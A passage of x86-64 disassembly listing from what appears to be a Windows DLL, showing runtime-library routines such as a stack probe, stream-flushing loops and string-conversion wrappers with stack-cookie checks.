   180006c44:	cc                   	int3
   180006c45:	cc                   	int3
   180006c46:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   180006c4d:	00 00 00 
   180006c50:	48 83 ec 10          	sub    $0x10,%rsp
   180006c54:	4c 89 14 24          	mov    %r10,(%rsp)
   180006c58:	4c 89 5c 24 08       	mov    %r11,0x8(%rsp)
   180006c5d:	4d 33 db             	xor    %r11,%r11
   180006c60:	4c 8d 54 24 18       	lea    0x18(%rsp),%r10
   180006c65:	4c 2b d0             	sub    %rax,%r10
   180006c68:	4d 0f 42 d3          	cmovb  %r11,%r10
   180006c6c:	65 4c 8b 1c 25 10 00 	mov    %gs:0x10,%r11
   180006c73:	00 00 
   180006c75:	4d 3b d3             	cmp    %r11,%r10
   180006c78:	73 16                	jae    0x180006c90
   180006c7a:	66 41 81 e2 00 f0    	and    $0xf000,%r10w
   180006c80:	4d 8d 9b 00 f0 ff ff 	lea    -0x1000(%r11),%r11
   180006c87:	41 c6 03 00          	movb   $0x0,(%r11)
   180006c8b:	4d 3b d3             	cmp    %r11,%r10
   180006c8e:	75 f0                	jne    0x180006c80
   180006c90:	4c 8b 14 24          	mov    (%rsp),%r10
   180006c94:	4c 8b 5c 24 08       	mov    0x8(%rsp),%r11
   180006c99:	48 83 c4 10          	add    $0x10,%rsp
   180006c9d:	c3                   	ret
   180006c9e:	cc                   	int3
   180006c9f:	cc                   	int3
   180006ca0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180006ca5:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   180006caa:	57                   	push   %rdi
   180006cab:	48 83 ec 30          	sub    $0x30,%rsp
   180006caf:	33 ff                	xor    %edi,%edi
   180006cb1:	8d 4f 01             	lea    0x1(%rdi),%ecx
   180006cb4:	e8 27 f1 ff ff       	call   0x180005de0
   180006cb9:	90                   	nop
   180006cba:	8d 5f 03             	lea    0x3(%rdi),%ebx
   180006cbd:	89 5c 24 20          	mov    %ebx,0x20(%rsp)
   180006cc1:	3b 1d 39 87 00 00    	cmp    0x8739(%rip),%ebx        # 0x18000f400
   180006cc7:	7d 65                	jge    0x180006d2e
   180006cc9:	48 63 f3             	movslq %ebx,%rsi
   180006ccc:	48 8b 05 15 77 00 00 	mov    0x7715(%rip),%rax        # 0x18000e3e8
   180006cd3:	48 83 3c f0 00       	cmpq   $0x0,(%rax,%rsi,8)
   180006cd8:	74 50                	je     0x180006d2a
   180006cda:	48 8b 0c f0          	mov    (%rax,%rsi,8),%rcx
   180006cde:	f6 41 18 83          	testb  $0x83,0x18(%rcx)
   180006ce2:	74 10                	je     0x180006cf4
   180006ce4:	e8 eb 16 00 00       	call   0x1800083d4
   180006ce9:	83 f8 ff             	cmp    $0xffffffff,%eax
   180006cec:	74 06                	je     0x180006cf4
   180006cee:	ff c7                	inc    %edi
   180006cf0:	89 7c 24 24          	mov    %edi,0x24(%rsp)
   180006cf4:	83 fb 14             	cmp    $0x14,%ebx
   180006cf7:	7c 31                	jl     0x180006d2a
   180006cf9:	48 8b 05 e8 76 00 00 	mov    0x76e8(%rip),%rax        # 0x18000e3e8
   180006d00:	48 8b 0c f0          	mov    (%rax,%rsi,8),%rcx
   180006d04:	48 83 c1 30          	add    $0x30,%rcx
   180006d08:	ff 15 1a 24 00 00    	call   *0x241a(%rip)        # 0x180009128
   180006d0e:	48 8b 0d d3 76 00 00 	mov    0x76d3(%rip),%rcx        # 0x18000e3e8
   180006d15:	48 8b 0c f1          	mov    (%rcx,%rsi,8),%rcx
   180006d19:	e8 9a bf ff ff       	call   0x180002cb8
   180006d1e:	4c 8b 1d c3 76 00 00 	mov    0x76c3(%rip),%r11        # 0x18000e3e8
   180006d25:	49 83 24 f3 00       	andq   $0x0,(%r11,%rsi,8)
   180006d2a:	ff c3                	inc    %ebx
   180006d2c:	eb 8f                	jmp    0x180006cbd
   180006d2e:	b9 01 00 00 00       	mov    $0x1,%ecx
   180006d33:	e8 a8 ef ff ff       	call   0x180005ce0
   180006d38:	8b c7                	mov    %edi,%eax
   180006d3a:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   180006d3f:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   180006d44:	48 83 c4 30          	add    $0x30,%rsp
   180006d48:	5f                   	pop    %rdi
   180006d49:	c3                   	ret
   180006d4a:	cc                   	int3
   180006d4b:	cc                   	int3
   180006d4c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180006d51:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   180006d56:	57                   	push   %rdi
   180006d57:	48 83 ec 20          	sub    $0x20,%rsp
   180006d5b:	8b 41 18             	mov    0x18(%rcx),%eax
   180006d5e:	33 f6                	xor    %esi,%esi
   180006d60:	48 8b d9             	mov    %rcx,%rbx
   180006d63:	24 03                	and    $0x3,%al
   180006d65:	3c 02                	cmp    $0x2,%al
   180006d67:	75 3f                	jne    0x180006da8
   180006d69:	f7 41 18 08 01 00 00 	testl  $0x108,0x18(%rcx)
   180006d70:	74 36                	je     0x180006da8
   180006d72:	8b 39                	mov    (%rcx),%edi
   180006d74:	2b 79 10             	sub    0x10(%rcx),%edi
   180006d77:	85 ff                	test   %edi,%edi
   180006d79:	7e 2d                	jle    0x180006da8
   180006d7b:	e8 e0 dc ff ff       	call   0x180004a60
   180006d80:	48 8b 53 10          	mov    0x10(%rbx),%rdx
   180006d84:	44 8b c7             	mov    %edi,%r8d
   180006d87:	8b c8                	mov    %eax,%ecx
   180006d89:	e8 2a d9 ff ff       	call   0x1800046b8
   180006d8e:	3b c7                	cmp    %edi,%eax
   180006d90:	75 0f                	jne    0x180006da1
   180006d92:	8b 43 18             	mov    0x18(%rbx),%eax
   180006d95:	84 c0                	test   %al,%al
   180006d97:	79 0f                	jns    0x180006da8
   180006d99:	83 e0 fd             	and    $0xfffffffd,%eax
   180006d9c:	89 43 18             	mov    %eax,0x18(%rbx)
   180006d9f:	eb 07                	jmp    0x180006da8
   180006da1:	83 4b 18 20          	orl    $0x20,0x18(%rbx)
   180006da5:	83 ce ff             	or     $0xffffffff,%esi
   180006da8:	48 8b 4b 10          	mov    0x10(%rbx),%rcx
   180006dac:	83 63 08 00          	andl   $0x0,0x8(%rbx)
   180006db0:	8b c6                	mov    %esi,%eax
   180006db2:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   180006db7:	48 89 0b             	mov    %rcx,(%rbx)
   180006dba:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180006dbf:	48 83 c4 20          	add    $0x20,%rsp
   180006dc3:	5f                   	pop    %rdi
   180006dc4:	c3                   	ret
   180006dc5:	cc                   	int3
   180006dc6:	cc                   	int3
   180006dc7:	cc                   	int3
   180006dc8:	40 53                	rex push %rbx
   180006dca:	48 83 ec 20          	sub    $0x20,%rsp
   180006dce:	48 8b d9             	mov    %rcx,%rbx
   180006dd1:	48 85 c9             	test   %rcx,%rcx
   180006dd4:	75 0a                	jne    0x180006de0
   180006dd6:	48 83 c4 20          	add    $0x20,%rsp
   180006dda:	5b                   	pop    %rbx
   180006ddb:	e9 34 00 00 00       	jmp    0x180006e14
   180006de0:	e8 67 ff ff ff       	call   0x180006d4c
   180006de5:	85 c0                	test   %eax,%eax
   180006de7:	74 05                	je     0x180006dee
   180006de9:	83 c8 ff             	or     $0xffffffff,%eax
   180006dec:	eb 20                	jmp    0x180006e0e
   180006dee:	f7 43 18 00 40 00 00 	testl  $0x4000,0x18(%rbx)
   180006df5:	74 15                	je     0x180006e0c
   180006df7:	48 8b cb             	mov    %rbx,%rcx
   180006dfa:	e8 61 dc ff ff       	call   0x180004a60
   180006dff:	8b c8                	mov    %eax,%ecx
   180006e01:	e8 36 16 00 00       	call   0x18000843c
   180006e06:	f7 d8                	neg    %eax
   180006e08:	1b c0                	sbb    %eax,%eax
   180006e0a:	eb 02                	jmp    0x180006e0e
   180006e0c:	33 c0                	xor    %eax,%eax
   180006e0e:	48 83 c4 20          	add    $0x20,%rsp
   180006e12:	5b                   	pop    %rbx
   180006e13:	c3                   	ret
   180006e14:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180006e19:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   180006e1e:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   180006e23:	41 54                	push   %r12
   180006e25:	41 55                	push   %r13
   180006e27:	41 57                	push   %r15
   180006e29:	48 83 ec 30          	sub    $0x30,%rsp
   180006e2d:	44 8b e9             	mov    %ecx,%r13d
   180006e30:	33 f6                	xor    %esi,%esi
   180006e32:	33 ff                	xor    %edi,%edi
   180006e34:	8d 4e 01             	lea    0x1(%rsi),%ecx
   180006e37:	e8 a4 ef ff ff       	call   0x180005de0
   180006e3c:	90                   	nop
   180006e3d:	33 db                	xor    %ebx,%ebx
   180006e3f:	41 83 cf ff          	or     $0xffffffff,%r15d
   180006e43:	89 5c 24 20          	mov    %ebx,0x20(%rsp)
   180006e47:	3b 1d b3 85 00 00    	cmp    0x85b3(%rip),%ebx        # 0x18000f400
   180006e4d:	0f 8d 80 00 00 00    	jge    0x180006ed3
   180006e53:	4c 63 e3             	movslq %ebx,%r12
   180006e56:	48 8b 05 8b 75 00 00 	mov    0x758b(%rip),%rax        # 0x18000e3e8
   180006e5d:	4a 83 3c e0 00       	cmpq   $0x0,(%rax,%r12,8)
   180006e62:	74 68                	je     0x180006ecc
   180006e64:	4a 8b 14 e0          	mov    (%rax,%r12,8),%rdx
   180006e68:	f6 42 18 83          	testb  $0x83,0x18(%rdx)
   180006e6c:	74 5e                	je     0x180006ecc
   180006e6e:	8b cb                	mov    %ebx,%ecx
   180006e70:	e8 4b db ff ff       	call   0x1800049c0
   180006e75:	90                   	nop
   180006e76:	48 8b 05 6b 75 00 00 	mov    0x756b(%rip),%rax        # 0x18000e3e8
   180006e7d:	4a 8b 0c e0          	mov    (%rax,%r12,8),%rcx
   180006e81:	f6 41 18 83          	testb  $0x83,0x18(%rcx)
   180006e85:	74 33                	je     0x180006eba
   180006e87:	41 83 fd 01          	cmp    $0x1,%r13d
   180006e8b:	75 12                	jne    0x180006e9f
   180006e8d:	e8 36 ff ff ff       	call   0x180006dc8
   180006e92:	41 3b c7             	cmp    %r15d,%eax
   180006e95:	74 23                	je     0x180006eba
   180006e97:	ff c6                	inc    %esi
   180006e99:	89 74 24 24          	mov    %esi,0x24(%rsp)
   180006e9d:	eb 1b                	jmp    0x180006eba
   180006e9f:	45 85 ed             	test   %r13d,%r13d
   180006ea2:	75 16                	jne    0x180006eba
   180006ea4:	f6 41 18 02          	testb  $0x2,0x18(%rcx)
   180006ea8:	74 10                	je     0x180006eba
   180006eaa:	e8 19 ff ff ff       	call   0x180006dc8
   180006eaf:	41 3b c7             	cmp    %r15d,%eax
   180006eb2:	41 0f 44 ff          	cmove  %r15d,%edi
   180006eb6:	89 7c 24 28          	mov    %edi,0x28(%rsp)
   180006eba:	48 8b 15 27 75 00 00 	mov    0x7527(%rip),%rdx        # 0x18000e3e8
   180006ec1:	4a 8b 14 e2          	mov    (%rdx,%r12,8),%rdx
   180006ec5:	8b cb                	mov    %ebx,%ecx
   180006ec7:	e8 74 db ff ff       	call   0x180004a40
   180006ecc:	ff c3                	inc    %ebx
   180006ece:	e9 70 ff ff ff       	jmp    0x180006e43
   180006ed3:	b9 01 00 00 00       	mov    $0x1,%ecx
   180006ed8:	e8 03 ee ff ff       	call   0x180005ce0
   180006edd:	41 83 fd 01          	cmp    $0x1,%r13d
   180006ee1:	0f 44 fe             	cmove  %esi,%edi
   180006ee4:	8b c7                	mov    %edi,%eax
   180006ee6:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   180006eeb:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   180006ef0:	48 8b 7c 24 60       	mov    0x60(%rsp),%rdi
   180006ef5:	48 83 c4 30          	add    $0x30,%rsp
   180006ef9:	41 5f                	pop    %r15
   180006efb:	41 5d                	pop    %r13
   180006efd:	41 5c                	pop    %r12
   180006eff:	c3                   	ret
   180006f00:	b9 01 00 00 00       	mov    $0x1,%ecx
   180006f05:	e9 0a ff ff ff       	jmp    0x180006e14
   180006f0a:	cc                   	int3
   180006f0b:	cc                   	int3
   180006f0c:	40 55                	rex push %rbp
   180006f0e:	41 54                	push   %r12
   180006f10:	41 55                	push   %r13
   180006f12:	41 56                	push   %r14
   180006f14:	41 57                	push   %r15
   180006f16:	48 83 ec 50          	sub    $0x50,%rsp
   180006f1a:	48 8d 6c 24 40       	lea    0x40(%rsp),%rbp
   180006f1f:	48 89 5d 40          	mov    %rbx,0x40(%rbp)
   180006f23:	48 89 75 48          	mov    %rsi,0x48(%rbp)
   180006f27:	48 89 7d 50          	mov    %rdi,0x50(%rbp)
   180006f2b:	48 8b 05 3e 60 00 00 	mov    0x603e(%rip),%rax        # 0x18000cf70
   180006f32:	48 33 c5             	xor    %rbp,%rax
   180006f35:	48 89 45 08          	mov    %rax,0x8(%rbp)
   180006f39:	8b 5d 60             	mov    0x60(%rbp),%ebx
   180006f3c:	33 ff                	xor    %edi,%edi
   180006f3e:	4d 8b f1             	mov    %r9,%r14
   180006f41:	45 8b f8             	mov    %r8d,%r15d
   180006f44:	89 55 00             	mov    %edx,0x0(%rbp)
   180006f47:	85 db                	test   %ebx,%ebx
   180006f49:	7e 2a                	jle    0x180006f75
   180006f4b:	44 8b d3             	mov    %ebx,%r10d
   180006f4e:	49 8b c1             	mov    %r9,%rax
   180006f51:	41 ff ca             	dec    %r10d
   180006f54:	40 38 38             	cmp    %dil,(%rax)
   180006f57:	74 0c                	je     0x180006f65
   180006f59:	48 ff c0             	inc    %rax
   180006f5c:	45 85 d2             	test   %r10d,%r10d
   180006f5f:	75 f0                	jne    0x180006f51
   180006f61:	41 83 ca ff          	or     $0xffffffff,%r10d
   180006f65:	8b c3                	mov    %ebx,%eax
   180006f67:	41 2b c2             	sub    %r10d,%eax
   180006f6a:	ff c8                	dec    %eax
   180006f6c:	3b c3                	cmp    %ebx,%eax
   180006f6e:	8d 58 01             	lea    0x1(%rax),%ebx
   180006f71:	7c 02                	jl     0x180006f75
   180006f73:	8b d8                	mov    %eax,%ebx
   180006f75:	44 8b 65 78          	mov    0x78(%rbp),%r12d
   180006f79:	8b f7                	mov    %edi,%esi
   180006f7b:	45 85 e4             	test   %r12d,%r12d
   180006f7e:	75 07                	jne    0x180006f87
   180006f80:	48 8b 01             	mov    (%rcx),%rax
   180006f83:	44 8b 60 04          	mov    0x4(%rax),%r12d
   180006f87:	f7 9d 80 00 00 00    	negl   0x80(%rbp)
   180006f8d:	44 8b cb             	mov    %ebx,%r9d
   180006f90:	4d 8b c6             	mov    %r14,%r8
   180006f93:	1b d2                	sbb    %edx,%edx
   180006f95:	41 8b cc             	mov    %r12d,%ecx
   180006f98:	89 7c 24 28          	mov    %edi,0x28(%rsp)
   180006f9c:	83 e2 08             	and    $0x8,%edx
   180006f9f:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   180006fa4:	ff c2                	inc    %edx
   180006fa6:	ff 15 5c 22 00 00    	call   *0x225c(%rip)        # 0x180009208
   180006fac:	4c 63 e8             	movslq %eax,%r13
   180006faf:	85 c0                	test   %eax,%eax
   180006fb1:	75 07                	jne    0x180006fba
   180006fb3:	33 c0                	xor    %eax,%eax
   180006fb5:	e9 f6 01 00 00       	jmp    0x1800071b0
   180006fba:	49 b8 f0 ff ff ff ff 	movabs $0xffffffffffffff0,%r8
   180006fc1:	ff ff 0f 
   180006fc4:	85 c0                	test   %eax,%eax
   180006fc6:	7e 5e                	jle    0x180007026
   180006fc8:	33 d2                	xor    %edx,%edx
   180006fca:	48 8d 42 e0          	lea    -0x20(%rdx),%rax
   180006fce:	49 f7 f5             	div    %r13
   180006fd1:	48 83 f8 02          	cmp    $0x2,%rax
   180006fd5:	72 4f                	jb     0x180007026
   180006fd7:	4b 8d 4c 2d 10       	lea    0x10(%r13,%r13,1),%rcx
   180006fdc:	48 81 f9 00 04 00 00 	cmp    $0x400,%rcx
   180006fe3:	77 2a                	ja     0x18000700f
   180006fe5:	48 8d 41 0f          	lea    0xf(%rcx),%rax
   180006fe9:	48 3b c1             	cmp    %rcx,%rax
   180006fec:	77 03                	ja     0x180006ff1
   180006fee:	49 8b c0             	mov    %r8,%rax
   180006ff1:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
   180006ff5:	e8 56 fc ff ff       	call   0x180006c50
   180006ffa:	48 2b e0             	sub    %rax,%rsp
   180006ffd:	48 8d 7c 24 40       	lea    0x40(%rsp),%rdi
   180007002:	48 85 ff             	test   %rdi,%rdi
   180007005:	74 ac                	je     0x180006fb3
   180007007:	c7 07 cc cc 00 00    	movl   $0xcccc,(%rdi)
   18000700d:	eb 13                	jmp    0x180007022
   18000700f:	e8 10 ee ff ff       	call   0x180005e24
   180007014:	48 8b f8             	mov    %rax,%rdi
   180007017:	48 85 c0             	test   %rax,%rax
   18000701a:	74 0a                	je     0x180007026
   18000701c:	c7 00 dd dd 00 00    	movl   $0xdddd,(%rax)
   180007022:	48 83 c7 10          	add    $0x10,%rdi
   180007026:	48 85 ff             	test   %rdi,%rdi
   180007029:	74 88                	je     0x180006fb3
   18000702b:	44 8b cb             	mov    %ebx,%r9d
   18000702e:	4d 8b c6             	mov    %r14,%r8
   180007031:	ba 01 00 00 00       	mov    $0x1,%edx
   180007036:	41 8b cc             	mov    %r12d,%ecx
   180007039:	44 89 6c 24 28       	mov    %r13d,0x28(%rsp)
   18000703e:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   180007043:	ff 15 bf 21 00 00    	call   *0x21bf(%rip)        # 0x180009208
   180007049:	85 c0                	test   %eax,%eax
   18000704b:	0f 84 4c 01 00 00    	je     0x18000719d
   180007051:	44 8b 75 00          	mov    0x0(%rbp),%r14d
   180007055:	21 74 24 28          	and    %esi,0x28(%rsp)
   180007059:	48 21 74 24 20       	and    %rsi,0x20(%rsp)
   18000705e:	41 8b ce             	mov    %r14d,%ecx
   180007061:	45 8b cd             	mov    %r13d,%r9d
   180007064:	4c 8b c7             	mov    %rdi,%r8
   180007067:	41 8b d7             	mov    %r15d,%edx
   18000706a:	ff 15 a0 21 00 00    	call   *0x21a0(%rip)        # 0x180009210
   180007070:	48 63 f0             	movslq %eax,%rsi
   180007073:	85 c0                	test   %eax,%eax
   180007075:	0f 84 22 01 00 00    	je     0x18000719d
   18000707b:	41 b8 00 04 00 00    	mov    $0x400,%r8d
   180007081:	45 85 f8             	test   %r15d,%r8d
   180007084:	74 37                	je     0x1800070bd
   180007086:	8b 4d 70             	mov    0x70(%rbp),%ecx
   180007089:	85 c9                	test   %ecx,%ecx
   18000708b:	0f 84 0c 01 00 00    	je     0x18000719d
   180007091:	3b f1                	cmp    %ecx,%esi
   180007093:	0f 8f 04 01 00 00    	jg     0x18000719d
   180007099:	48 8b 45 68          	mov    0x68(%rbp),%rax
   18000709d:	89 4c 24 28          	mov    %ecx,0x28(%rsp)
   1800070a1:	45 8b cd             	mov    %r13d,%r9d
   1800070a4:	4c 8b c7             	mov    %rdi,%r8
   1800070a7:	41 8b d7             	mov    %r15d,%edx
   1800070aa:	41 8b ce             	mov    %r14d,%ecx
   1800070ad:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1800070b2:	ff 15 58 21 00 00    	call   *0x2158(%rip)        # 0x180009210
   1800070b8:	e9 e0 00 00 00       	jmp    0x18000719d
   1800070bd:	85 c0                	test   %eax,%eax
   1800070bf:	7e 67                	jle    0x180007128
   1800070c1:	33 d2                	xor    %edx,%edx
   1800070c3:	48 8d 42 e0          	lea    -0x20(%rdx),%rax
   1800070c7:	48 f7 f6             	div    %rsi
   1800070ca:	48 83 f8 02          	cmp    $0x2,%rax
   1800070ce:	72 58                	jb     0x180007128
   1800070d0:	48 8d 4c 36 10       	lea    0x10(%rsi,%rsi,1),%rcx
   1800070d5:	49 3b c8             	cmp    %r8,%rcx
   1800070d8:	77 35                	ja     0x18000710f
   1800070da:	48 8d 41 0f          	lea    0xf(%rcx),%rax
   1800070de:	48 3b c1             	cmp    %rcx,%rax
   1800070e1:	77 0a                	ja     0x1800070ed
   1800070e3:	48 b8 f0 ff ff ff ff 	movabs $0xffffffffffffff0,%rax
   1800070ea:	ff ff 0f 
   1800070ed:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
   1800070f1:	e8 5a fb ff ff       	call   0x180006c50
   1800070f6:	48 2b e0             	sub    %rax,%rsp
   1800070f9:	48 8d 5c 24 40       	lea    0x40(%rsp),%rbx
   1800070fe:	48 85 db             	test   %rbx,%rbx
   180007101:	0f 84 96 00 00 00    	je     0x18000719d
   180007107:	c7 03 cc cc 00 00    	movl   $0xcccc,(%rbx)
   18000710d:	eb 13                	jmp    0x180007122
   18000710f:	e8 10 ed ff ff       	call   0x180005e24
   180007114:	48 8b d8             	mov    %rax,%rbx
   180007117:	48 85 c0             	test   %rax,%rax
   18000711a:	74 0e                	je     0x18000712a
   18000711c:	c7 00 dd dd 00 00    	movl   $0xdddd,(%rax)
   180007122:	48 83 c3 10          	add    $0x10,%rbx
   180007126:	eb 02                	jmp    0x18000712a
   180007128:	33 db                	xor    %ebx,%ebx
   18000712a:	48 85 db             	test   %rbx,%rbx
   18000712d:	74 6e                	je     0x18000719d
   18000712f:	45 8b cd             	mov    %r13d,%r9d
   180007132:	4c 8b c7             	mov    %rdi,%r8
   180007135:	41 8b d7             	mov    %r15d,%edx
   180007138:	41 8b ce             	mov    %r14d,%ecx
   18000713b:	89 74 24 28          	mov    %esi,0x28(%rsp)
   18000713f:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   180007144:	ff 15 c6 20 00 00    	call   *0x20c6(%rip)        # 0x180009210
   18000714a:	33 c9                	xor    %ecx,%ecx
   18000714c:	85 c0                	test   %eax,%eax
   18000714e:	74 3c                	je     0x18000718c
   180007150:	8b 45 70             	mov    0x70(%rbp),%eax
   180007153:	33 d2                	xor    %edx,%edx
   180007155:	48 89 4c 24 38       	mov    %rcx,0x38(%rsp)
   18000715a:	44 8b ce             	mov    %esi,%r9d
   18000715d:	4c 8b c3             	mov    %rbx,%r8
   180007160:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   180007165:	85 c0                	test   %eax,%eax
   180007167:	75 0b                	jne    0x180007174
   180007169:	89 4c 24 28          	mov    %ecx,0x28(%rsp)
   18000716d:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   180007172:	eb 0d                	jmp    0x180007181
   180007174:	89 44 24 28          	mov    %eax,0x28(%rsp)
   180007178:	48 8b 45 68          	mov    0x68(%rbp),%rax
   18000717c:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180007181:	41 8b cc             	mov    %r12d,%ecx
   180007184:	ff 15 b6 1f 00 00    	call   *0x1fb6(%rip)        # 0x180009140
   18000718a:	8b f0                	mov    %eax,%esi
   18000718c:	48 8d 4b f0          	lea    -0x10(%rbx),%rcx
   180007190:	81 39 dd dd 00 00    	cmpl   $0xdddd,(%rcx)
   180007196:	75 05                	jne    0x18000719d
   180007198:	e8 1b bb ff ff       	call   0x180002cb8
   18000719d:	48 8d 4f f0          	lea    -0x10(%rdi),%rcx
   1800071a1:	81 39 dd dd 00 00    	cmpl   $0xdddd,(%rcx)
   1800071a7:	75 05                	jne    0x1800071ae
   1800071a9:	e8 0a bb ff ff       	call   0x180002cb8
   1800071ae:	8b c6                	mov    %esi,%eax
   1800071b0:	48 8b 4d 08          	mov    0x8(%rbp),%rcx
   1800071b4:	48 33 cd             	xor    %rbp,%rcx
   1800071b7:	e8 a4 e8 ff ff       	call   0x180005a60
   1800071bc:	48 8b 5d 40          	mov    0x40(%rbp),%rbx
   1800071c0:	48 8b 75 48          	mov    0x48(%rbp),%rsi
   1800071c4:	48 8b 7d 50          	mov    0x50(%rbp),%rdi
   1800071c8:	48 8d 65 10          	lea    0x10(%rbp),%rsp
   1800071cc:	41 5f                	pop    %r15
   1800071ce:	41 5e                	pop    %r14
   1800071d0:	41 5d                	pop    %r13
   1800071d2:	41 5c                	pop    %r12
   1800071d4:	5d                   	pop    %rbp
   1800071d5:	c3                   	ret
   1800071d6:	cc                   	int3
   1800071d7:	cc                   	int3
   1800071d8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800071dd:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1800071e2:	57                   	push   %rdi
   1800071e3:	48 83 ec 70          	sub    $0x70,%rsp
   1800071e7:	8b f2                	mov    %edx,%esi
   1800071e9:	48 8b d1             	mov    %rcx,%rdx
   1800071ec:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   1800071f1:	49 8b d9             	mov    %r9,%rbx
   1800071f4:	41 8b f8             	mov    %r8d,%edi
   1800071f7:	e8 c0 a5 ff ff       	call   0x1800017bc
   1800071fc:	8b 84 24 b8 00 00 00 	mov    0xb8(%rsp),%eax
   180007203:	44 8b 9c 24 c0 00 00 	mov    0xc0(%rsp),%r11d
   18000720a:	00 
   18000720b:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   180007210:	44 89 5c 24 40       	mov    %r11d,0x40(%rsp)
   180007215:	89 44 24 38          	mov    %eax,0x38(%rsp)
   180007219:	8b 84 24 b0 00 00 00 	mov    0xb0(%rsp),%eax
   180007220:	89 44 24 30          	mov    %eax,0x30(%rsp)
   180007224:	48 8b 84 24 a8 00 00 	mov    0xa8(%rsp),%rax
   18000722b:	00 
   18000722c:	4c 8b cb             	mov    %rbx,%r9
   18000722f:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   180007234:	8b 84 24 a0 00 00 00 	mov    0xa0(%rsp),%eax
   18000723b:	44 8b c7             	mov    %edi,%r8d
   18000723e:	8b d6                	mov    %esi,%edx
   180007240:	89 44 24 20          	mov    %eax,0x20(%rsp)
   180007244:	e8 c3 fc ff ff       	call   0x180006f0c
   180007249:	80 7c 24 68 00       	cmpb   $0x0,0x68(%rsp)
   18000724e:	74 0c                	je     0x18000725c
   180007250:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   180007255:	83 a1 c8 00 00 00 fd 	andl   $0xfffffffd,0xc8(%rcx)
   18000725c:	4c 8d 5c 24 70       	lea    0x70(%rsp),%r11
   180007261:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   180007265:	49 8b 73 18          	mov    0x18(%r11),%rsi
   180007269:	49 8b e3             	mov    %r11,%rsp
   18000726c:	5f                   	pop    %rdi
   18000726d:	c3                   	ret
   18000726e:	cc                   	int3
   18000726f:	cc                   	int3
   180007270:	40 55                	rex push %rbp
   180007272:	41 54                	push   %r12
   180007274:	41 55                	push   %r13
   180007276:	41 56                	push   %r14
   180007278:	41 57                	push   %r15
   18000727a:	48 83 ec 40          	sub    $0x40,%rsp
   18000727e:	48 8d 6c 24 30       	lea    0x30(%rsp),%rbp
   180007283:	48 89 5d 40          	mov    %rbx,0x40(%rbp)
   180007287:	48 89 75 48          	mov    %rsi,0x48(%rbp)
   18000728b:	48 89 7d 50          	mov    %rdi,0x50(%rbp)
   18000728f:	48 8b 05 da 5c 00 00 	mov    0x5cda(%rip),%rax        # 0x18000cf70
   180007296:	48 33 c5             	xor    %rbp,%rax
   180007299:	48 89 45 00          	mov    %rax,0x0(%rbp)
   18000729d:	8b 75 68             	mov    0x68(%rbp),%esi
   1800072a0:	33 ff                	xor    %edi,%edi
   1800072a2:	45 8b e9             	mov    %r9d,%r13d
   1800072a5:	4d 8b f0             	mov    %r8,%r14
   1800072a8:	44 8b fa             	mov    %edx,%r15d
   1800072ab:	85 f6                	test   %esi,%esi
   1800072ad:	75 06                	jne    0x1800072b5
   1800072af:	48 8b 01             	mov    (%rcx),%rax
   1800072b2:	8b 70 04             	mov    0x4(%rax),%esi
   1800072b5:	f7 5d 70             	negl   0x70(%rbp)
   1800072b8:	8b ce                	mov    %esi,%ecx
   1800072ba:	89 7c 24 28          	mov    %edi,0x28(%rsp)
   1800072be:	1b d2                	sbb    %edx,%edx
   1800072c0:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1800072c5:	83 e2 08             	and    $0x8,%edx
   1800072c8:	ff c2                	inc    %edx
   1800072ca:	ff 15 38 1f 00 00    	call   *0x1f38(%rip)        # 0x180009208
   1800072d0:	4c 63 e0             	movslq %eax,%r12
   1800072d3:	85 c0                	test   %eax,%eax
   1800072d5:	75 07                	jne    0x1800072de
   1800072d7:	33 c0                	xor    %eax,%eax
   1800072d9:	e9 ca 00 00 00       	jmp    0x1800073a8
   1800072de:	7e 67                	jle    0x180007347
   1800072e0:	48 b8 f0 ff ff ff ff 	movabs $0x7ffffffffffffff0,%rax
   1800072e7:	ff ff 7f 
   1800072ea:	4c 3b e0             	cmp    %rax,%r12
   1800072ed:	77 58                	ja     0x180007347
   1800072ef:	4b 8d 4c 24 10       	lea    0x10(%r12,%r12,1),%rcx
   1800072f4:	48 81 f9 00 04 00 00 	cmp    $0x400,%rcx
   1800072fb:	77 31                	ja     0x18000732e
   1800072fd:	48 8d 41 0f          	lea    0xf(%rcx),%rax
   180007301:	48 3b c1             	cmp    %rcx,%rax
   180007304:	77 0a                	ja     0x180007310
   180007306:	48 b8 f0 ff ff ff ff 	movabs $0xffffffffffffff0,%rax
   18000730d:	ff ff 0f 
   180007310:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
   180007314:	e8 37 f9 ff ff       	call   0x180006c50
   180007319:	48 2b e0             	sub    %rax,%rsp
   18000731c:	48 8d 5c 24 30       	lea    0x30(%rsp),%rbx
   180007321:	48 85 db             	test   %rbx,%rbx
   180007324:	74 b1                	je     0x1800072d7
